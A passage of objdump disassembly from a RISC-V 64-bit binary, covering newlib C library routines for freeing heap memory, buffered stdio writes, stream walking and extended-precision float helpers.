   1278c:	e618                	sd	a4,8(a2)
   1278e:	6398                	ld	a4,0(a5)
   12790:	ff078613          	addi	a2,a5,-16
   12794:	ee90                	sd	a2,24(a3)
   12796:	ea98                	sd	a4,16(a3)
   12798:	e394                	sd	a3,0(a5)
   1279a:	ef14                	sd	a3,24(a4)
   1279c:	b78d                	j	126fe <_free_r+0x6a>
   1279e:	4805                	li	a6,1
   127a0:	bf49                	j	12732 <_free_r+0x9e>
   127a2:	6d8c                	ld	a1,24(a1)
   127a4:	ef0c                	sd	a1,24(a4)
   127a6:	e998                	sd	a4,16(a1)
   127a8:	bf45                	j	12758 <_free_r+0xc4>
   127aa:	0097d593          	srli	a1,a5,0x9
   127ae:	4711                	li	a4,4
   127b0:	02b76e63          	bltu	a4,a1,127ec <_free_r+0x158>
   127b4:	0067d713          	srli	a4,a5,0x6
   127b8:	0387071b          	addiw	a4,a4,56
   127bc:	0017059b          	addiw	a1,a4,1
   127c0:	0015959b          	slliw	a1,a1,0x1
   127c4:	058e                	slli	a1,a1,0x3
   127c6:	95b2                	add	a1,a1,a2
   127c8:	ff058513          	addi	a0,a1,-16
   127cc:	618c                	ld	a1,0(a1)
   127ce:	06b51563          	bne	a0,a1,12838 <_free_r+0x1a4>
   127d2:	4785                	li	a5,1
   127d4:	4027571b          	sraiw	a4,a4,0x2
   127d8:	00e79733          	sll	a4,a5,a4
   127dc:	661c                	ld	a5,8(a2)
   127de:	8f5d                	or	a4,a4,a5
   127e0:	e618                	sd	a4,8(a2)
   127e2:	ee88                	sd	a0,24(a3)
   127e4:	ea8c                	sd	a1,16(a3)
   127e6:	e914                	sd	a3,16(a0)
   127e8:	ed94                	sd	a3,24(a1)
   127ea:	bf11                	j	126fe <_free_r+0x6a>
   127ec:	4751                	li	a4,20
   127ee:	00b76563          	bltu	a4,a1,127f8 <_free_r+0x164>
   127f2:	05b5871b          	addiw	a4,a1,91
   127f6:	b7d9                	j	127bc <_free_r+0x128>
   127f8:	05400713          	li	a4,84
   127fc:	00b76763          	bltu	a4,a1,1280a <_free_r+0x176>
   12800:	00c7d713          	srli	a4,a5,0xc
   12804:	06e7071b          	addiw	a4,a4,110
   12808:	bf55                	j	127bc <_free_r+0x128>
   1280a:	15400713          	li	a4,340
   1280e:	00b76763          	bltu	a4,a1,1281c <_free_r+0x188>
   12812:	00f7d713          	srli	a4,a5,0xf
   12816:	0777071b          	addiw	a4,a4,119
   1281a:	b74d                	j	127bc <_free_r+0x128>
   1281c:	55400513          	li	a0,1364
   12820:	07e00713          	li	a4,126
   12824:	f8b56ce3          	bltu	a0,a1,127bc <_free_r+0x128>
   12828:	0127d713          	srli	a4,a5,0x12
   1282c:	07c7071b          	addiw	a4,a4,124
   12830:	b771                	j	127bc <_free_r+0x128>
   12832:	698c                	ld	a1,16(a1)
   12834:	00b50663          	beq	a0,a1,12840 <_free_r+0x1ac>
   12838:	6598                	ld	a4,8(a1)
   1283a:	9b71                	andi	a4,a4,-4
   1283c:	fee7ebe3          	bltu	a5,a4,12832 <_free_r+0x19e>
   12840:	6d88                	ld	a0,24(a1)
   12842:	b745                	j	127e2 <_free_r+0x14e>
   12844:	8082                	ret

0000000000012846 <__sfvwrite_r>:
   12846:	6a1c                	ld	a5,16(a2)
   12848:	e781                	bnez	a5,12850 <__sfvwrite_r+0xa>
   1284a:	4781                	li	a5,0
   1284c:	853e                	mv	a0,a5
   1284e:	8082                	ret
   12850:	0105d783          	lhu	a5,16(a1)
   12854:	7119                	addi	sp,sp,-128
   12856:	f8a2                	sd	s0,112(sp)
   12858:	f0ca                	sd	s2,96(sp)
   1285a:	e8d2                	sd	s4,80(sp)
   1285c:	fc86                	sd	ra,120(sp)
   1285e:	f4a6                	sd	s1,104(sp)
   12860:	ecce                	sd	s3,88(sp)
   12862:	e4d6                	sd	s5,72(sp)
   12864:	e0da                	sd	s6,64(sp)
   12866:	fc5e                	sd	s7,56(sp)
   12868:	f862                	sd	s8,48(sp)
   1286a:	f466                	sd	s9,40(sp)
   1286c:	f06a                	sd	s10,32(sp)
   1286e:	ec6e                	sd	s11,24(sp)
   12870:	8ba1                	andi	a5,a5,8
   12872:	8a32                	mv	s4,a2
   12874:	842e                	mv	s0,a1
   12876:	892a                	mv	s2,a0
   12878:	cfd1                	beqz	a5,12914 <__sfvwrite_r+0xce>
   1287a:	6d9c                	ld	a5,24(a1)
   1287c:	cfc1                	beqz	a5,12914 <__sfvwrite_r+0xce>
   1287e:	01045783          	lhu	a5,16(s0)
   12882:	000a3983          	ld	s3,0(s4)
   12886:	0027f713          	andi	a4,a5,2
   1288a:	0e071863          	bnez	a4,1297a <__sfvwrite_r+0x134>
   1288e:	8b85                	andi	a5,a5,1
   12890:	4a81                	li	s5,0
   12892:	16078463          	beqz	a5,129fa <__sfvwrite_r+0x1b4>
   12896:	4501                	li	a0,0
   12898:	4b81                	li	s7,0
   1289a:	4b01                	li	s6,0
   1289c:	240b0863          	beqz	s6,12aec <__sfvwrite_r+0x2a6>
   128a0:	e919                	bnez	a0,128b6 <__sfvwrite_r+0x70>
   128a2:	865a                	mv	a2,s6
   128a4:	45a9                	li	a1,10
   128a6:	855e                	mv	a0,s7
   128a8:	148020ef          	jal	ra,149f0 <memchr>
   128ac:	24050763          	beqz	a0,12afa <__sfvwrite_r+0x2b4>
   128b0:	0505                	addi	a0,a0,1
   128b2:	41750abb          	subw	s5,a0,s7
   128b6:	8c56                	mv	s8,s5
   128b8:	015b7363          	bleu	s5,s6,128be <__sfvwrite_r+0x78>
   128bc:	8c5a                	mv	s8,s6
   128be:	6008                	ld	a0,0(s0)
   128c0:	6c1c                	ld	a5,24(s0)
   128c2:	5014                	lw	a3,32(s0)
   128c4:	22a7fe63          	bleu	a0,a5,12b00 <__sfvwrite_r+0x2ba>
   128c8:	4444                	lw	s1,12(s0)
   128ca:	9cb5                	addw	s1,s1,a3
   128cc:	2384da63          	ble	s8,s1,12b00 <__sfvwrite_r+0x2ba>
   128d0:	85de                	mv	a1,s7
   128d2:	8626                	mv	a2,s1
   128d4:	1f4020ef          	jal	ra,14ac8 <memmove>
   128d8:	601c                	ld	a5,0(s0)
   128da:	85a2                	mv	a1,s0
   128dc:	854a                	mv	a0,s2
   128de:	97a6                	add	a5,a5,s1
   128e0:	e01c                	sd	a5,0(s0)
   128e2:	acbff0ef          	jal	ra,123ac <_fflush_r>
   128e6:	10051263          	bnez	a0,129ea <__sfvwrite_r+0x1a4>
   128ea:	409a8abb          	subw	s5,s5,s1
   128ee:	4505                	li	a0,1
   128f0:	000a9763          	bnez	s5,128fe <__sfvwrite_r+0xb8>
   128f4:	85a2                	mv	a1,s0
   128f6:	854a                	mv	a0,s2
   128f8:	ab5ff0ef          	jal	ra,123ac <_fflush_r>
   128fc:	e57d                	bnez	a0,129ea <__sfvwrite_r+0x1a4>
   128fe:	010a3783          	ld	a5,16(s4)
   12902:	9ba6                	add	s7,s7,s1
   12904:	409b0b33          	sub	s6,s6,s1
   12908:	409784b3          	sub	s1,a5,s1
   1290c:	009a3823          	sd	s1,16(s4)
   12910:	f4d1                	bnez	s1,1289c <__sfvwrite_r+0x56>
   12912:	a099                	j	12958 <__sfvwrite_r+0x112>
   12914:	85a2                	mv	a1,s0
   12916:	854a                	mv	a0,s2
   12918:	f46ff0ef          	jal	ra,1205e <__swsetup_r>
   1291c:	57fd                	li	a5,-1
   1291e:	d125                	beqz	a0,1287e <__sfvwrite_r+0x38>
   12920:	a82d                	j	1295a <__sfvwrite_r+0x114>
   12922:	0009ba83          	ld	s5,0(s3)
   12926:	0089b483          	ld	s1,8(s3)
   1292a:	09c1                	addi	s3,s3,16
   1292c:	d8fd                	beqz	s1,12922 <__sfvwrite_r+0xdc>
   1292e:	86a6                	mv	a3,s1
   12930:	009b7363          	bleu	s1,s6,12936 <__sfvwrite_r+0xf0>
   12934:	86da                	mv	a3,s6
   12936:	603c                	ld	a5,64(s0)
   12938:	780c                	ld	a1,48(s0)
   1293a:	2681                	sext.w	a3,a3
   1293c:	8656                	mv	a2,s5
   1293e:	854a                	mv	a0,s2
   12940:	9782                	jalr	a5
   12942:	0aa05463          	blez	a0,129ea <__sfvwrite_r+0x1a4>
   12946:	010a3783          	ld	a5,16(s4)
   1294a:	9aaa                	add	s5,s5,a0
   1294c:	8c89                	sub	s1,s1,a0
   1294e:	40a78533          	sub	a0,a5,a0
   12952:	00aa3823          	sd	a0,16(s4)
   12956:	f979                	bnez	a0,1292c <__sfvwrite_r+0xe6>
   12958:	4781                	li	a5,0
   1295a:	70e6                	ld	ra,120(sp)
   1295c:	7446                	ld	s0,112(sp)
   1295e:	74a6                	ld	s1,104(sp)
   12960:	7906                	ld	s2,96(sp)
   12962:	69e6                	ld	s3,88(sp)
   12964:	6a46                	ld	s4,80(sp)
   12966:	6aa6                	ld	s5,72(sp)
   12968:	6b06                	ld	s6,64(sp)
   1296a:	7be2                	ld	s7,56(sp)
   1296c:	7c42                	ld	s8,48(sp)
   1296e:	7ca2                	ld	s9,40(sp)
   12970:	7d02                	ld	s10,32(sp)
   12972:	6de2                	ld	s11,24(sp)
   12974:	853e                	mv	a0,a5
   12976:	6109                	addi	sp,sp,128
   12978:	8082                	ret
   1297a:	80000b37          	lui	s6,0x80000
   1297e:	4a81                	li	s5,0
   12980:	4481                	li	s1,0
   12982:	c00b4b13          	xori	s6,s6,-1024
   12986:	b75d                	j	1292c <__sfvwrite_r+0xe6>
   12988:	0009ba83          	ld	s5,0(s3)
   1298c:	0089bd03          	ld	s10,8(s3)
   12990:	09c1                	addi	s3,s3,16
   12992:	4444                	lw	s1,12(s0)
   12994:	87a6                	mv	a5,s1
   12996:	fe0d09e3          	beqz	s10,12988 <__sfvwrite_r+0x142>
   1299a:	01045703          	lhu	a4,16(s0)
   1299e:	6008                	ld	a0,0(s0)
   129a0:	20077693          	andi	a3,a4,512
   129a4:	0e068863          	beqz	a3,12a94 <__sfvwrite_r+0x24e>
   129a8:	089d6963          	bltu	s10,s1,12a3a <__sfvwrite_r+0x1f4>
   129ac:	48077693          	andi	a3,a4,1152
   129b0:	c6c9                	beqz	a3,12a3a <__sfvwrite_r+0x1f4>
   129b2:	5004                	lw	s1,32(s0)
   129b4:	6c0c                	ld	a1,24(s0)
   129b6:	029c04bb          	mulw	s1,s8,s1
   129ba:	8d0d                	sub	a0,a0,a1
   129bc:	00050d9b          	sext.w	s11,a0
   129c0:	001d8793          	addi	a5,s11,1
   129c4:	97ea                	add	a5,a5,s10
   129c6:	0394c4bb          	divw	s1,s1,s9
   129ca:	00f4f563          	bleu	a5,s1,129d4 <__sfvwrite_r+0x18e>
   129ce:	2505                	addiw	a0,a0,1
   129d0:	01a504bb          	addw	s1,a0,s10
   129d4:	40077713          	andi	a4,a4,1024
   129d8:	cf49                	beqz	a4,12a72 <__sfvwrite_r+0x22c>
   129da:	85a6                	mv	a1,s1
   129dc:	854a                	mv	a0,s2
   129de:	2e5010ef          	jal	ra,144c2 <_malloc_r>
   129e2:	e515                	bnez	a0,12a0e <__sfvwrite_r+0x1c8>
   129e4:	47b1                	li	a5,12
   129e6:	00f92023          	sw	a5,0(s2)
   129ea:	01045783          	lhu	a5,16(s0)
   129ee:	0407e793          	ori	a5,a5,64
   129f2:	00f41823          	sh	a5,16(s0)
   129f6:	57fd                	li	a5,-1
   129f8:	b78d                	j	1295a <__sfvwrite_r+0x114>
   129fa:	80000b37          	lui	s6,0x80000
   129fe:	ffeb4b93          	xori	s7,s6,-2
   12a02:	4d01                	li	s10,0
   12a04:	fffb4b13          	not	s6,s6
   12a08:	4c0d                	li	s8,3
   12a0a:	4c89                	li	s9,2
   12a0c:	b759                	j	12992 <__sfvwrite_r+0x14c>
   12a0e:	6c0c                	ld	a1,24(s0)
   12a10:	866e                	mv	a2,s11
   12a12:	e42a                	sd	a0,8(sp)
   12a14:	7f7010ef          	jal	ra,14a0a <memcpy>
   12a18:	01045703          	lhu	a4,16(s0)
   12a1c:	67a2                	ld	a5,8(sp)
   12a1e:	b7f77713          	andi	a4,a4,-1153
   12a22:	08076713          	ori	a4,a4,128
   12a26:	00e41823          	sh	a4,16(s0)
   12a2a:	ec1c                	sd	a5,24(s0)
   12a2c:	d004                	sw	s1,32(s0)
   12a2e:	97ee                	add	a5,a5,s11
   12a30:	41b484bb          	subw	s1,s1,s11
   12a34:	e01c                	sd	a5,0(s0)
   12a36:	c444                	sw	s1,12(s0)
   12a38:	87ea                	mv	a5,s10
   12a3a:	84ea                	mv	s1,s10
   12a3c:	00fd7363          	bleu	a5,s10,12a42 <__sfvwrite_r+0x1fc>
   12a40:	87ea                	mv	a5,s10
   12a42:	6008                	ld	a0,0(s0)
   12a44:	863e                	mv	a2,a5
   12a46:	85d6                	mv	a1,s5
   12a48:	e43e                	sd	a5,8(sp)
   12a4a:	07e020ef          	jal	ra,14ac8 <memmove>
   12a4e:	4458                	lw	a4,12(s0)
   12a50:	67a2                	ld	a5,8(sp)
   12a52:	9f1d                	subw	a4,a4,a5
   12a54:	c458                	sw	a4,12(s0)
   12a56:	6018                	ld	a4,0(s0)
   12a58:	97ba                	add	a5,a5,a4
   12a5a:	e01c                	sd	a5,0(s0)
   12a5c:	010a3783          	ld	a5,16(s4)
   12a60:	9aa6                	add	s5,s5,s1
   12a62:	409d0d33          	sub	s10,s10,s1
   12a66:	409784b3          	sub	s1,a5,s1
   12a6a:	009a3823          	sd	s1,16(s4)
   12a6e:	f095                	bnez	s1,12992 <__sfvwrite_r+0x14c>
   12a70:	b5e5                	j	12958 <__sfvwrite_r+0x112>
   12a72:	8626                	mv	a2,s1
   12a74:	854a                	mv	a0,s2
   12a76:	2ad020ef          	jal	ra,15522 <_realloc_r>
   12a7a:	87aa                	mv	a5,a0
   12a7c:	f55d                	bnez	a0,12a2a <__sfvwrite_r+0x1e4>
   12a7e:	6c0c                	ld	a1,24(s0)
   12a80:	854a                	mv	a0,s2
   12a82:	c13ff0ef          	jal	ra,12694 <_free_r>
   12a86:	01045783          	lhu	a5,16(s0)
   12a8a:	f7f7f793          	andi	a5,a5,-129
   12a8e:	00f41823          	sh	a5,16(s0)
   12a92:	bf89                	j	129e4 <__sfvwrite_r+0x19e>
   12a94:	6c1c                	ld	a5,24(s0)
   12a96:	00a7e563          	bltu	a5,a0,12aa0 <__sfvwrite_r+0x25a>
   12a9a:	5014                	lw	a3,32(s0)
   12a9c:	02dd7763          	bleu	a3,s10,12aca <__sfvwrite_r+0x284>
   12aa0:	009d7363          	bleu	s1,s10,12aa6 <__sfvwrite_r+0x260>
   12aa4:	84ea                	mv	s1,s10
   12aa6:	8626                	mv	a2,s1
   12aa8:	85d6                	mv	a1,s5
   12aaa:	01e020ef          	jal	ra,14ac8 <memmove>
   12aae:	445c                	lw	a5,12(s0)
   12ab0:	4097873b          	subw	a4,a5,s1
   12ab4:	601c                	ld	a5,0(s0)
   12ab6:	c458                	sw	a4,12(s0)
   12ab8:	97a6                	add	a5,a5,s1
   12aba:	e01c                	sd	a5,0(s0)
   12abc:	f345                	bnez	a4,12a5c <__sfvwrite_r+0x216>
   12abe:	85a2                	mv	a1,s0
   12ac0:	854a                	mv	a0,s2
   12ac2:	8ebff0ef          	jal	ra,123ac <_fflush_r>
   12ac6:	d959                	beqz	a0,12a5c <__sfvwrite_r+0x216>
   12ac8:	b70d                	j	129ea <__sfvwrite_r+0x1a4>
   12aca:	87da                	mv	a5,s6
   12acc:	01abe363          	bltu	s7,s10,12ad2 <__sfvwrite_r+0x28c>
   12ad0:	87ea                	mv	a5,s10
   12ad2:	02d7c7bb          	divw	a5,a5,a3
   12ad6:	6038                	ld	a4,64(s0)
   12ad8:	780c                	ld	a1,48(s0)
   12ada:	8656                	mv	a2,s5
   12adc:	854a                	mv	a0,s2
   12ade:	02d786bb          	mulw	a3,a5,a3
   12ae2:	9702                	jalr	a4
   12ae4:	84aa                	mv	s1,a0
   12ae6:	f6a04be3          	bgtz	a0,12a5c <__sfvwrite_r+0x216>
   12aea:	b701                	j	129ea <__sfvwrite_r+0x1a4>
   12aec:	0009bb83          	ld	s7,0(s3)
   12af0:	0089bb03          	ld	s6,8(s3)
   12af4:	4501                	li	a0,0
   12af6:	09c1                	addi	s3,s3,16
   12af8:	b355                	j	1289c <__sfvwrite_r+0x56>
   12afa:	001b0a9b          	addiw	s5,s6,1
   12afe:	bb65                	j	128b6 <__sfvwrite_r+0x70>
   12b00:	00dc4b63          	blt	s8,a3,12b16 <__sfvwrite_r+0x2d0>
   12b04:	603c                	ld	a5,64(s0)
   12b06:	780c                	ld	a1,48(s0)
   12b08:	865e                	mv	a2,s7
   12b0a:	854a                	mv	a0,s2
   12b0c:	9782                	jalr	a5
   12b0e:	84aa                	mv	s1,a0
   12b10:	dca04de3          	bgtz	a0,128ea <__sfvwrite_r+0xa4>
   12b14:	bdd9                	j	129ea <__sfvwrite_r+0x1a4>
   12b16:	8662                	mv	a2,s8
   12b18:	85de                	mv	a1,s7
   12b1a:	7af010ef          	jal	ra,14ac8 <memmove>
   12b1e:	445c                	lw	a5,12(s0)
   12b20:	84e2                	mv	s1,s8
   12b22:	418787bb          	subw	a5,a5,s8
   12b26:	c45c                	sw	a5,12(s0)
   12b28:	601c                	ld	a5,0(s0)
   12b2a:	97e2                	add	a5,a5,s8
   12b2c:	e01c                	sd	a5,0(s0)
   12b2e:	bb75                	j	128ea <__sfvwrite_r+0xa4>

0000000000012b30 <_fwalk>:
   12b30:	715d                	addi	sp,sp,-80
   12b32:	e0a2                	sd	s0,64(sp)
   12b34:	fc26                	sd	s1,56(sp)
   12b36:	f052                	sd	s4,32(sp)
   12b38:	ec56                	sd	s5,24(sp)
   12b3a:	e486                	sd	ra,72(sp)
   12b3c:	f84a                	sd	s2,48(sp)
   12b3e:	f44e                	sd	s3,40(sp)
   12b40:	52050493          	addi	s1,a0,1312
   12b44:	4401                	li	s0,0
   12b46:	4a05                	li	s4,1
   12b48:	5afd                	li	s5,-1
   12b4a:	e899                	bnez	s1,12b60 <_fwalk+0x30>
   12b4c:	8522                	mv	a0,s0
   12b4e:	60a6                	ld	ra,72(sp)
   12b50:	6406                	ld	s0,64(sp)
   12b52:	74e2                	ld	s1,56(sp)
   12b54:	7942                	ld	s2,48(sp)
   12b56:	79a2                	ld	s3,40(sp)
   12b58:	7a02                	ld	s4,32(sp)
   12b5a:	6ae2                	ld	s5,24(sp)
   12b5c:	6161                	addi	sp,sp,80
   12b5e:	8082                	ret
   12b60:	0104b903          	ld	s2,16(s1)
   12b64:	0084a983          	lw	s3,8(s1)
   12b68:	39fd                	addiw	s3,s3,-1
   12b6a:	0009d463          	bgez	s3,12b72 <_fwalk+0x42>
   12b6e:	6084                	ld	s1,0(s1)
   12b70:	bfe9                	j	12b4a <_fwalk+0x1a>
   12b72:	01095783          	lhu	a5,16(s2)
   12b76:	00fa7c63          	bleu	a5,s4,12b8e <_fwalk+0x5e>
   12b7a:	01291783          	lh	a5,18(s2)
   12b7e:	01578863          	beq	a5,s5,12b8e <_fwalk+0x5e>
   12b82:	854a                	mv	a0,s2
   12b84:	e42e                	sd	a1,8(sp)
   12b86:	9582                	jalr	a1
   12b88:	65a2                	ld	a1,8(sp)
   12b8a:	8c49                	or	s0,s0,a0
   12b8c:	2401                	sext.w	s0,s0
   12b8e:	0b090913          	addi	s2,s2,176
   12b92:	bfd9                	j	12b68 <_fwalk+0x38>

0000000000012b94 <_fwalk_reent>:
   12b94:	715d                	addi	sp,sp,-80
   12b96:	e0a2                	sd	s0,64(sp)
   12b98:	fc26                	sd	s1,56(sp)
   12b9a:	f052                	sd	s4,32(sp)
   12b9c:	ec56                	sd	s5,24(sp)
   12b9e:	e85a                	sd	s6,16(sp)
   12ba0:	e45e                	sd	s7,8(sp)
   12ba2:	e486                	sd	ra,72(sp)
   12ba4:	f84a                	sd	s2,48(sp)
   12ba6:	f44e                	sd	s3,40(sp)
   12ba8:	8a2a                	mv	s4,a0
   12baa:	8aae                	mv	s5,a1
   12bac:	52050493          	addi	s1,a0,1312
   12bb0:	4401                	li	s0,0
   12bb2:	4b05                	li	s6,1
   12bb4:	5bfd                	li	s7,-1
   12bb6:	ec89                	bnez	s1,12bd0 <_fwalk_reent+0x3c>
   12bb8:	8522                	mv	a0,s0
   12bba:	60a6                	ld	ra,72(sp)
   12bbc:	6406                	ld	s0,64(sp)
   12bbe:	74e2                	ld	s1,56(sp)
   12bc0:	7942                	ld	s2,48(sp)
   12bc2:	79a2                	ld	s3,40(sp)
   12bc4:	7a02                	ld	s4,32(sp)
   12bc6:	6ae2                	ld	s5,24(sp)
   12bc8:	6b42                	ld	s6,16(sp)
   12bca:	6ba2                	ld	s7,8(sp)
   12bcc:	6161                	addi	sp,sp,80
   12bce:	8082                	ret
   12bd0:	0104b903          	ld	s2,16(s1)
   12bd4:	0084a983          	lw	s3,8(s1)
   12bd8:	39fd                	addiw	s3,s3,-1
   12bda:	0009d463          	bgez	s3,12be2 <_fwalk_reent+0x4e>
   12bde:	6084                	ld	s1,0(s1)
   12be0:	bfd9                	j	12bb6 <_fwalk_reent+0x22>
   12be2:	01095783          	lhu	a5,16(s2)
   12be6:	00fb7b63          	bleu	a5,s6,12bfc <_fwalk_reent+0x68>
   12bea:	01291783          	lh	a5,18(s2)
   12bee:	01778763          	beq	a5,s7,12bfc <_fwalk_reent+0x68>
   12bf2:	85ca                	mv	a1,s2
   12bf4:	8552                	mv	a0,s4
   12bf6:	9a82                	jalr	s5
   12bf8:	8c49                	or	s0,s0,a0
   12bfa:	2401                	sext.w	s0,s0
   12bfc:	0b090913          	addi	s2,s2,176
   12c00:	bfe1                	j	12bd8 <_fwalk_reent+0x44>

0000000000012c02 <eclear>:
   12c02:	01450793          	addi	a5,a0,20
   12c06:	0509                	addi	a0,a0,2
   12c08:	fe051f23          	sh	zero,-2(a0)
   12c0c:	fef51de3          	bne	a0,a5,12c06 <eclear+0x4>
   12c10:	8082                	ret

0000000000012c12 <emov>:
   12c12:	01450793          	addi	a5,a0,20
   12c16:	0509                	addi	a0,a0,2
   12c18:	ffe55703          	lhu	a4,-2(a0)
   12c1c:	0589                	addi	a1,a1,2
   12c1e:	fee59f23          	sh	a4,-2(a1)
   12c22:	fea79ae3          	bne	a5,a0,12c16 <emov+0x4>
   12c26:	8082                	ret

0000000000012c28 <ecleaz>:
   12c28:	01a50793          	addi	a5,a0,26
   12c2c:	0509                	addi	a0,a0,2
   12c2e:	fe051f23          	sh	zero,-2(a0)
   12c32:	fef51de3          	bne	a0,a5,12c2c <ecleaz+0x4>
   12c36:	8082                	ret

0000000000012c38 <emovz>:
   12c38:	01850713          	addi	a4,a0,24
   12c3c:	87ae                	mv	a5,a1
   12c3e:	0509                	addi	a0,a0,2
   12c40:	ffe55683          	lhu	a3,-2(a0)
   12c44:	0789                	addi	a5,a5,2
   12c46:	fed79f23          	sh	a3,-2(a5)
   12c4a:	fea71ae3          	bne	a4,a0,12c3e <emovz+0x6>
   12c4e:	00059c23          	sh	zero,24(a1)
   12c52:	8082                	ret

0000000000012c54 <ecmpm>:
   12c54:	00450793          	addi	a5,a0,4
   12c58:	0591                	addi	a1,a1,4
   12c5a:	0569                	addi	a0,a0,26
   12c5c:	0789                	addi	a5,a5,2
   12c5e:	0589                	addi	a1,a1,2
   12c60:	ffe7d683          	lhu	a3,-2(a5)
   12c64:	ffe5d703          	lhu	a4,-2(a1)
   12c68:	00e69663          	bne	a3,a4,12c74 <ecmpm+0x20>
   12c6c:	fef518e3          	bne	a0,a5,12c5c <ecmpm+0x8>
   12c70:	4501                	li	a0,0
   12c72:	8082                	ret
   12c74:	4505                	li	a0,1
   12c76:	00d76363          	bltu	a4,a3,12c7c <ecmpm+0x28>
   12c7a:	557d                	li	a0,-1
   12c7c:	8082                	ret

0000000000012c7e <eshdn1>:
   12c7e:	00450693          	addi	a3,a0,4
   12c82:	4781                	li	a5,0
   12c84:	0569                	addi	a0,a0,26
   12c86:	7661                	lui	a2,0xffff8
   12c88:	0006d703          	lhu	a4,0(a3)
   12c8c:	00177593          	andi	a1,a4,1
   12c90:	c199                	beqz	a1,12c96 <eshdn1+0x18>
   12c92:	0017e793          	ori	a5,a5,1
   12c96:	0027f593          	andi	a1,a5,2
   12c9a:	8305                	srli	a4,a4,0x1
   12c9c:	e999                	bnez	a1,12cb2 <eshdn1+0x34>
   12c9e:	0017979b          	slliw	a5,a5,0x1
   12ca2:	00e69023          	sh	a4,0(a3)
   12ca6:	17c2                	slli	a5,a5,0x30
   12ca8:	0689                	addi	a3,a3,2
   12caa:	93c1                	srli	a5,a5,0x30
   12cac:	fcd51ee3          	bne	a0,a3,12c88 <eshdn1+0xa>
   12cb0:	8082                	ret
   12cb2:	8f51                	or	a4,a4,a2
   12cb4:	b7ed                	j	12c9e <eshdn1+0x20>

0000000000012cb6 <eshup1>:
   12cb6:	01650693          	addi	a3,a0,22
   12cba:	4701                	li	a4,0
   12cbc:	0026d783          	lhu	a5,2(a3)
   12cc0:	0107961b          	slliw	a2,a5,0x10
   12cc4:	4106561b          	sraiw	a2,a2,0x10
   12cc8:	00065463          	bgez	a2,12cd0 <eshup1+0x1a>
   12ccc:	00176713          	ori	a4,a4,1
   12cd0:	0017979b          	slliw	a5,a5,0x1
   12cd4:	17c2                	slli	a5,a5,0x30
   12cd6:	00277613          	andi	a2,a4,2
   12cda:	93c1                	srli	a5,a5,0x30
   12cdc:	ea19                	bnez	a2,12cf2 <eshup1+0x3c>
   12cde:	0017171b          	slliw	a4,a4,0x1
   12ce2:	00f69123          	sh	a5,2(a3)
   12ce6:	1742                	slli	a4,a4,0x30
   12ce8:	16f9                	addi	a3,a3,-2
   12cea:	9341                	srli	a4,a4,0x30
   12cec:	fcd518e3          	bne	a0,a3,12cbc <eshup1+0x6>
   12cf0:	8082                	ret
   12cf2:	0017e793          	ori	a5,a5,1
   12cf6:	b7e5                	j	12cde <eshup1+0x28>

0000000000012cf8 <eshdn8>:
   12cf8:	00450793          	addi	a5,a0,4
   12cfc:	4701                	li	a4,0
   12cfe:	0569                	addi	a0,a0,26
   12d00:	0007d683          	lhu	a3,0(a5)
   12d04:	0789                	addi	a5,a5,2
   12d06:	0086d61b          	srliw	a2,a3,0x8
   12d0a:	8f51                	or	a4,a4,a2
   12d0c:	fee79f23          	sh	a4,-2(a5)
   12d10:	0086971b          	slliw	a4,a3,0x8
   12d14:	1742                	slli	a4,a4,0x30
   12d16:	9341                	srli	a4,a4,0x30
   12d18:	fef514e3          	bne	a0,a5,12d00 <eshdn8+0x8>
   12d1c:	8082                	ret

0000000000012d1e <eshup8>:
   12d1e:	01650793          	addi	a5,a0,22
   12d22:	4701                	li	a4,0
   12d24:	0027d683          	lhu	a3,2(a5)
   12d28:	17f9                	addi	a5,a5,-2
   12d2a:	00869613          	slli	a2,a3,0x8
   12d2e:	8f51                	or	a4,a4,a2
   12d30:	00e79223          	sh	a4,4(a5)
   12d34:	0086d713          	srli	a4,a3,0x8
   12d38:	fef516e3          	bne	a0,a5,12d24 <eshup8+0x6>
   12d3c:	8082                	ret

0000000000012d3e <eshup6>:
   12d3e:	00450793          	addi	a5,a0,4
   12d42:	01850713          	addi	a4,a0,24
   12d46:	0789                	addi	a5,a5,2
   12d48:	0007d683          	lhu	a3,0(a5)
   12d4c:	fed79f23          	sh	a3,-2(a5)
   12d50:	fef71be3          	bne	a4,a5,12d46 <eshup6+0x8>
   12d54:	00051c23          	sh	zero,24(a0)
   12d58:	8082                	ret

0000000000012d5a <eshdn6>:
   12d5a:	01850793          	addi	a5,a0,24
   12d5e:	01a50713          	addi	a4,a0,26
   12d62:	00450693          	addi	a3,a0,4
   12d66:	17f9                	addi	a5,a5,-2
   12d68:	0007d603          	lhu	a2,0(a5)
   12d6c:	1779                	addi	a4,a4,-2
   12d6e:	00c71023          	sh	a2,0(a4) # 20400000 <_end+0x201cf4d8>
   12d72:	fef69ae3          	bne	a3,a5,12d66 <eshdn6+0xc>
   12d76:	00051223          	sh	zero,4(a0)
   12d7a:	8082                	ret

0000000000012d7c <eaddm>:
   12d7c:	05e1                	addi	a1,a1,24
   12d7e:	01650713          	addi	a4,a0,22
   12d82:	4681                	li	a3,0
   12d84:	0005d783          	lhu	a5,0(a1)
   12d88:	1779                	addi	a4,a4,-2
   12d8a:	15f9                	addi	a1,a1,-2
   12d8c:	97b6                	add	a5,a5,a3
   12d8e:	00475683          	lhu	a3,4(a4)
   12d92:	97b6                	add	a5,a5,a3
   12d94:	00f59123          	sh	a5,2(a1)
   12d98:	83c1                	srli	a5,a5,0x10
   12d9a:	0017f693          	andi	a3,a5,1
   12d9e:	fee513e3          	bne	a0,a4,12d84 <eaddm+0x8>
   12da2:	8082                	ret

0000000000012da4 <esubm>:
   12da4:	05e1                	addi	a1,a1,24
   12da6:	01650713          	addi	a4,a0,22
   12daa:	4681                	li	a3,0
   12dac:	0005d783          	lhu	a5,0(a1)
   12db0:	00275603          	lhu	a2,2(a4)
   12db4:	1779                	addi	a4,a4,-2
   12db6:	15f9                	addi	a1,a1,-2
   12db8:	8f91                	sub	a5,a5,a2
   12dba:	8f95                	sub	a5,a5,a3
   12dbc:	00f59123          	sh	a5,2(a1)
   12dc0:	83c1                	srli	a5,a5,0x10
   12dc2:	0017f693          	andi	a3,a5,1
   12dc6:	fee513e3          	bne	a0,a4,12dac <esubm+0x8>
   12dca:	8082                	ret

0000000000012dcc <m16m>:
   12dcc:	1101                	addi	sp,sp,-32
   12dce:	6341                	lui	t1,0x10
   12dd0:	01858893          	addi	a7,a1,24
   12dd4:	00011b23          	sh	zero,22(sp)
   12dd8:	00011c23          	sh	zero,24(sp)
   12ddc:	0591                	addi	a1,a1,4
   12dde:	0834                	addi	a3,sp,24
   12de0:	137d                	addi	t1,t1,-1
